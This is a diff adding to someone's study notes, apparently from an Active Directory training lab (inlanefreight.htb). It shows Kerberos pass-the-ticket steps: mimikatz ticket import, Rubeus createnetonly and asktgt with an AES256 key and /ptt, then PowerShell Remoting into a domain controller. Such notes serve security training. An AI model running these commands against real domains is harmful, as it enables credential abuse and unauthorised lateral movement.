@@ -511,3 +511,12 @@ mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e
 mimikatz # exit
 PS C:\tools> Enter-PSSession -ComputerName DC01
 ```
+%%  import the ticket we collected using kerberos::ptt. Once the ticket is imported into our cmd.exe session, we can launch a PowerShell command prompt from the same cmd.exe and use the command Enter-PSSession to connect to the target machine. %%
+
+```
+C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+c:\tools>powershell
+PS C:\tools> Enter-PSSession -ComputerName DC01
+```
+%% runas /netonly prevents erasure of exisiting TGTs for the current logon session then from that windows execute Rubeus to request a new TGT with th eoption /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting. %%
